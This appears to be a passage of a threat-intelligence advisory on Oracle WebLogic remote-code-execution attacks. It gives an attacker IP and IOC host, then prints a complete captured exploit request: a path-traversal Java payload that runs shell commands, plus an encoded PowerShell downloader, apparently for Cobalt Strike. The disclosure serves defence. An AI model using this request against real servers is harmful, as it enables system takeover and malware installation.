
We recommend affected systems to patch immediately.
Oracle WebLogic RCE attacks Below is brief information about the different attacks we have seen from our sensors and the payloads they try to install.
Attack Variant 1: Cobalt Strike Payload Attacker IP 45.77.178.169 Attack Port 7001 IOC 139[.]180.194.87 GET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=
com.tangosol.coherence.mvel2.sh.
ShellSession('weblogic.work.
ExecuteThread%20currentThread%20=%20\r\n(weblogic.work.
ExecuteThread)Thread.currentThread();%20weblogic.work.
WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.
Field%20field%20\r\n=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);\r\nweblogic.servlet.internal.
ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.
ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);\r\n%20String%20cmd%20=%20req.getHeader(%22cmd%22);String%5B%5D%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String%5B%5D%7B%22\r\ncmd.exe%22,%20%22/c%22,%20cmd%7D%20:%20new%20String%5B%5D%7B%22/bin/sh%22,%20%22-c%22,%20cmd%7D;if(cmd%20!=%20null%20)%7B%20String%20result%20=%20new%20java.util.
Scanner\r\n(new%20java.lang.
ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22%5C%5CA%22).next();%20weblogic.servlet.internal.
ServletResponseImpl%20res%20=%20\r\n(weblogic.servlet.internal.
ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream\r\n(new%20weblogic.xml.util.
StringInputStream(result));res.getServletOutputStream().flush();%7D%20currentThread.interrupt();') HTTP/1.0\r\n\r\nUser-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0)
Gecko/20100101 Firefox/67.0\r\n\r\nAccept-Encoding: gzip, deflate\r\n\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\nConnection: keep-alive\r\n\r\ncmd: powershell -ENC
DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbgAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AA0ACgAgA{redacted}